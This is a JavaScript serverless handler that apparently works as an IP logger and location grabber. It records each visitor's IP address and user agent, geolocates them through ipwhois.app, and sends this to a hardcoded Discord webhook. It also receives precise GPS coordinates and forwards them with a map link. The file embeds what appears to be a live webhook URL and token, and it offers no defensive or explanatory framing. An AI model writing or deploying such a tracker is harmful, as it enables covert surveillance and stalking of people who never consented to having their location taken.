export default async function handler(req, res) {
    // Enhanced IP detection
    const ip = req.headers['x-real-ip'] ||
        req.headers['x-forwarded-for']?.split(',')[0].trim() ||
        req.socket.remoteAddress;

    const webhookUrl = 'https://discord.com/api/webhooks/1477832242129666110/8QnLpB39E68xVJCXeU_Dfi9cM8SpNY76L8wLkCq0BPJlnlvUYSpEq5ymKkEJq4R7st38';

    // --- STEP 2: Handle GPS Coordinates (POST) ---
    if (req.method === 'POST') {
        const { latitude, longitude } = req.body;
        const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

        try {
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: `🎯 **PRECISE LOCATION RECEIVED!**\n**IP**: ${ip}\n**Exact Map**: ${mapLink}\n**Time**: ${new Date().toLocaleString()}`
                })
            });
            return res.status(200).json({ success: true });
        } catch (err) {
            return res.status(500).json({ error: 'Failed to send GPS log' });
        }
    }

    // --- STEP 1: Handle Initial IP Log (GET or Default) ---
    try {
        const geoResponse = await fetch(`https://ipwhois.app/json/${ip}`);
        const geoData = await geoResponse.json();
        const { city, region, country, latitude, longitude, success } = geoData;

        let content = success
            ? `🚀 **New Visitor Connected! (Step 1/2)**\n**IP**: ${ip}\n**Estimated Location**: ${city}, ${region}, ${country}\n**User-Agent**: ${req.headers['user-agent']}\n**Time**: ${new Date().toLocaleString()}`
            : `⚠️ **New Visitor (Geo-lookup failed)**\n**IP**: ${ip}\n**User-Agent**: ${req.headers['user-agent']}`;

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content })
        });

        return res.status(200).json(geoData);
    } catch (error) {
        console.error('Logging error:', error);
        return res.status(200).json({ ip });
    }
}
